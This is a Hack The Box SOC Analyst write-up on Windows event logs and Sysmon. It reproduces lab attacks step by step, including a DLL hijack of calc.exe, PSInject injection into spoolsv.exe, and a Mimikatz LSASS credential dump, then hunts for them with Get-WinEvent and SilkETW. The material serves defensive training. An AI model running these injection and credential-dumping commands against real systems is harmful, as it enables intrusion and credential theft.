# SOC-path-on-Hack-the-box
A brief write-up from the Security Operation Analyst pathway on Hack-the-box platform

# 🛡️ HTB SOC Analyst Path — Windows Event Logs & Sysmon Writeup

> **Module:** Windows Event Logs & Sysmon Analysis  
> **Path:** SOC Analyst  
> **Difficulty:** Medium  
> **Date:** September 28, 2024  
> **Tags:** `windows` `sysmon` `powershell` `credential-dumping` `dll-hijacking` `ETW` `threat-detection`

---

## 📖 Overview

This module covers hands-on detection and replication of common Windows-based attacks using Sysmon and Event Logs. The key attacks explored are:

- **DLL Hijacking** — abusing DLL search order to execute malicious code
- **Unmanaged PowerShell Injection** — injecting .NET runtime into a non-PowerShell process
- **Credential Dumping** — extracting NTLM hashes via Mimikatz
- **ETW Monitoring** — using SilkETW to intercept .NET runtime events
- **Log Analysis** — using `Get-WinEvent` and Chainsaw to hunt through event logs

---

## 🔬 Challenge 1: DLL Hijacking with Reflective DLL Injection

### 🧠 Concept

DLL hijacking exploits the Windows DLL search order. When an application loads a DLL by name without a full path, Windows searches through a list of directories in order. If an attacker places a malicious DLL with the correct name in a directory that appears earlier in the search order (e.g., the application's own folder), Windows will load the malicious DLL instead of the legitimate one.

In this challenge, we replace `WININET.dll` — a DLL loaded by `calc.exe` — with a reflective DLL that executes arbitrary code.

### 🚶 Walkthrough

**Step 1 — RDP into the target machine**

```bash
xfreerdp /u:Administrator /p:'HTB_@cad3my_lab_W1n10_r00t!@0' /v:<TARGET-IP> /dynamic-resolution
```

**Step 2 — Check the system architecture**

Open CMD and run:

```cmd
systeminfo
```

Look for the `System Type` field. Choose the matching DLL from `C:\Tools\Reflective DLLInjection`:
- `reflective_dll.x64.dll` → 64-bit systems
- `reflective_dll.dll` → 32-bit / ARM systems

> 📸 *[Screenshot: systeminfo output showing x64 architecture]*

**Step 3 — Rename the malicious DLL**

```cmd
cd "C:\Tools\Reflective DLLInjection"
ren "reflective_dll.x64.dll" WININET.dll
```

**Step 4 — Stage the attack (copy to Desktop alongside calc.exe)**

```cmd
copy C:\Windows\System32\calc.exe C:\Users\Administrator\Desktop\calc.exe
copy WININET.dll C:\Users\Administrator\Desktop\WININET.dll
```

**Step 5 — Execute calc.exe**

Double-click or run `calc.exe` from the Desktop. Because it now finds our malicious `WININET.dll` in its own directory first, a popup appears:

> 📸 *[Screenshot: "Hello from DllMain!" popup confirming DLL hijack]*

**Step 6 — Get the SHA256 hash of the malicious DLL**

*PowerShell:*
```powershell
Get-FileHash C:\Users\Administrator\Desktop\WININET.dll -Algorithm SHA256
```

*CMD:*
```cmd
CertUtil -hashfile C:\Users\Administrator\Desktop\WININET.dll SHA256
```

> 📸 *[Screenshot: Hash output in terminal]*

### ✅ Answer

```
REDACTED
```

---

## 🔬 Challenge 2: Unmanaged PowerShell Injection

### 🧠 Concept

"Unmanaged PowerShell" is a technique where an attacker injects the .NET CLR (Common Language Runtime) directly into a non-PowerShell process (in this case `spoolsv.exe`). This allows PowerShell code to execute inside a process that wouldn't normally raise PowerShell-related alerts, bypassing many detection rules that look for `powershell.exe` in the process tree.

The `PSInject` tool is used to perform this injection, and we can observe the side effect: `clrjit.dll` (the JIT compiler for .NET) gets loaded into the target process.

### 🚶 Walkthrough

**Step 1 — Launch PowerShell with execution policy bypassed**

```powershell
powershell -ep bypass
```

> `-ep bypass` disables script execution restrictions for the current session, allowing unsigned scripts to run.

**Step 2 — Import the PSInject module**

```powershell
Import-Module C:\Tools\PSInject\Invoke-PSInject.ps1
```

**Step 3 — Get the PID of spoolsv.exe**

```powershell
Get-Process spoolsv
```

> 📸 *[Screenshot: Get-Process output showing spoolsv PID]*

Note down the `Id` (PID) value.

**Step 4 — Inject PowerShell code into spoolsv.exe**

```powershell
Invoke-PSInject -ProcId <PID> -PoshCode "V3JpdGUtSG9zdCAiSGVsbG8sIEd1cnU5OSEi"
```

> The `-PoshCode` value is Base64-encoded PowerShell. Decoded, it runs: `Write-Host "Hello, Guru99!"`

**Step 5 — Verify injection using Process Hacker**

Open **Process Hacker**, locate `spoolsv.exe`, right-click → **Properties** → **Modules** tab. Look for `clrjit.dll` in the list and note its full path.

> 📸 *[Screenshot: Process Hacker showing clrjit.dll loaded in spoolsv.exe]*

**Step 6 — Hash the loaded DLL**

```powershell
Get-FileHash "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll" -Algorithm SHA256
```

> 📸 *[Screenshot: SHA256 output for clrjit.dll]*

### ✅ Answer

```
REDACTED
```

---

## 🔬 Challenge 3: Credential Dumping with Mimikatz

### 🧠 Concept

Mimikatz is one of the most well-known post-exploitation tools used for credential harvesting. It interfaces directly with LSASS (Local Security Authority Subsystem Service) — the Windows process responsible for managing authentication — to extract plaintext passwords, NTLM hashes, and Kerberos tickets from memory.

Defenders monitor for suspicious access to the LSASS process and for `sekurlsa` module usage patterns in Sysmon event logs (Event ID 10: Process Access).

### 🚶 Walkthrough

**Step 1 — Open an elevated CMD and navigate to Mimikatz**

```cmd
cd C:\Tools\Mimikatz
```

**Step 2 — Launch Mimikatz**

```cmd
mimikatz.exe
```

**Step 3 — Enable debug privileges**

```
privilege::debug
```

> This is required to access LSASS memory. Output should confirm `Privilege '20' OK`.

**Step 4 — Dump credentials from LSASS**

```
sekurlsa::logonpasswords
```

> 📸 *[Screenshot: Mimikatz output showing NTLM hash for Administrator]*

Look for the `Administrator` account entry and grab the `NTLM` value.

### ✅ Answer

```
REDACTED
```

---

## 🔬 Challenge 4: Tapping into ETW with SilkETW

### 🧠 Concept

ETW (Event Tracing for Windows) is a kernel-level logging framework built into Windows. It allows tools like **SilkETW** to subscribe to provider channels (e.g., the .NET Runtime provider) and capture rich telemetry in real time — including method calls, module loads, and interop activity. This is a powerful blue-team technique that can catch fileless malware and living-off-the-land (LotL) attacks that evade traditional log-based detection.

### 🚶 Walkthrough

**Step 1 — Start SilkETW to monitor .NET Runtime events**

```cmd
c:\Tools\SilkETW_SilkService_v8\v8\SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json
```

| Flag | Meaning |
|------|---------|
| `-t user` | User-mode tracing |
| `-pn` | Provider name (DotNETRuntime) |
| `-uk 0x2038` | Keyword filter bitmask |
| `-ot file` | Output to file |
| `-p` | Output path |

**Step 2 — While SilkETW is running, execute Seatbelt**

```powershell
cd "C:\Tools\GhostPack Compiled Binaries"
.\Seatbelt.exe TokenPrivileges
```

> 📸 *[Screenshot: Seatbelt running in PowerShell]*

**Step 3 — Inspect the ETW output file**

```powershell
Get-Content C:\windows\temp\etw.json | ConvertFrom-Json | Where-Object { $_.ManagedInteropMethodName -like "G*ion" }
```

> 📸 *[Screenshot: etw.json output with ManagedInteropMethodName visible]*

### ✅ Answer

```
REDACTED
```

---

## 🔬 Challenge 5: Get-WinEvent Log Analysis

### 🧠 Concept

`Get-WinEvent` is a powerful PowerShell cmdlet for querying `.evtx` Windows Event Log files. In SOC scenarios, analysts often receive exported logs and must triage them without a SIEM. This challenge simulates that workflow, hunting for the moment a suspicious network share (`\\*\PRINT`) was added.

### 🚶 Walkthrough

**Step 1 — Navigate to the log directory and search for share-related events**

```powershell
Get-ChildItem "C:\Tools\chainsaw\EVTX-ATTACK-SAMPLES\Lateral Movement" -Filter *.evtx | ForEach-Object {
    $events = Get-WinEvent -Path $_.FullName -ErrorAction SilentlyContinue |
        Where-Object { $_.Message -like "*share*" }
    if ($events) {
        Write-Output "File: $($_.Name)"
        $events | Select-Object -First 5 | ForEach-Object {
            Write-Output "Time: $($_.TimeCreated.ToString('HH:mm:ss'))"
            Write-Output "Message: $($_.Message.Substring(0, [Math]::Min(100, $_.Message.Length)))..."
            Write-Output "---"
        }
    }
}
```

> 📸 *[Screenshot: Get-WinEvent output showing share event at 12:30:30]*

**What this command does:**
- `Get-ChildItem ... -Filter *.evtx` — finds all event log files in the directory
- `Get-WinEvent -Path` — reads events from each file
- `Where-Object { $_.Message -like "*share*" }` — filters for events mentioning a share
- `TimeCreated.ToString('HH:mm:ss')` — formats the timestamp

### ✅ Answer

```
REDACTED
```

---

## 🎯 Skills Assessment

> ⚠️ **Challenge yourself first!** The answers are provided below, but I encourage you to work through these independently using the techniques from the module.

### Summary Table

| # | Log Directory | Question | Answer |
|---|--------------|----------|--------|
| 1 | `C:\Logs\DLLHijack` | Process responsible for DLL hijacking | `REDACTED` |
| 2 | `C:\Logs\PowershellExec` | Process that executed unmanaged PowerShell | `REDACTED` |
| 3 | `C:\Logs\PowershellExec` | Process that injected into the above | `REDACTED` |
| 4 | `C:\Logs\Dump` | Process that performed the LSASS dump | `REDACTED` |
| 5 | `C:\Logs\Dump` | Did an ill-intended login occur after the dump? | `REDACTED` |
| 6 | `C:\Logs\StrangePPID` | Process used via strange parent-child relationship | `REDACTED` |

### Key Commands Used

**Hunting for .exe names across logs:**
```powershell
Get-ChildItem "C:\Logs\DLLHijack" -Filter *.evtx | ForEach-Object {
    Get-WinEvent -Path $_.FullName -ErrorAction SilentlyContinue |
        Where-Object { $_.Message -like "*.exe*" } |
        ForEach-Object { $_.Message | Select-String -Pattern '\b\w+\.exe\b' -AllMatches } |
        ForEach-Object { $_.Matches } |
        ForEach-Object { $_.Value }
} | Sort-Object -Unique
```

**Hunting for CreateRemoteThread (injection evidence):**
```powershell
Get-WinEvent -Path "C:\Logs\PowershellExec\<file>.evtx" |
    Where-Object { $_.Message -like "*CreateRemoteThread*" } |
    Select-Object TimeCreated, Message
```

> 📸 *[Screenshot: Event Viewer showing Calculator.exe in PowershellExec logs]*  
> 📸 *[Screenshot: CreateRemoteThread event implicating rundll32.exe]*

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) | System-level event logging |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential extraction |
| [PSInject](https://github.com/EmpireProject/PSInject) | Unmanaged PowerShell injection |
| [SilkETW](https://github.com/mandiant/SilkETW) | ETW-based telemetry collection |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | Host enumeration & recon |
| [Process Hacker](https://processhacker.sourceforge.io/) | Live process & module inspection |
| [Chainsaw](https://github.com/WithSecureLabs/chainsaw) | Fast EVTX log hunting |
| `Get-WinEvent` | PowerShell cmdlet for log analysis |

---

## 📚 Key Takeaways

- **DLL Hijacking** can be detected via Sysmon Event ID 7 (Image Load) — look for DLLs loaded from unexpected paths
- **Unmanaged PowerShell** bypasses traditional `powershell.exe` detection — monitor for `clrjit.dll` loading in non-.NET processes
- **Credential Dumping** leaves traces in Sysmon Event ID 10 (Process Access) targeting `lsass.exe`
- **ETW** is a powerful telemetry layer that can catch in-memory attacks invisible to file-based detection
- **`Get-WinEvent`** is an essential tool for offline log triage without a SIEM

---

*Writeup by Umaru Bah | [GitHub Profile](https://github.com/bahh99)*
